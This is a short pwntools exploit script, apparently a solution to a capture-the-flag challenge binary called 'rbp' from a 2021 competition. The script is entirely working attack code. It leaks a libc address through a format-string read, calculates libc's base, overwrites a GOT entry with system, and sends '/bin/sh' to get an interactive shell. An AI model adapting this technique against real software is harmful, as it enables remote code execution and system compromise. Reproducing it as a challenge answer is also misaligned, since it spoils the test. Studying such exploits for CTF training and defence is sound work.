from pwn import *

elf = ELF("./rbp")
libc = elf.libc

target = elf.process()
#target = remote("pwn-2021.duc.tf", 31910)

def s(d):
	target.send(d)

s(p64(elf.got['atol'] + 0x20) + p64(0x004011f1) + p64(0x004011f1))# + p64(elf.plt['printf']))
s(str( - 0x20 ) + "%9$lx.")

target.recvuntil("number? ")
libc_base = int(target.recvuntil(".", drop=True), 0x10) - libc.sym['__libc_start_main'] - 243
log.info("LIBC Base: " + hex(libc_base))

s(p64(libc_base + libc.sym['system']))

s("/bin/sh\x00")

target.interactive()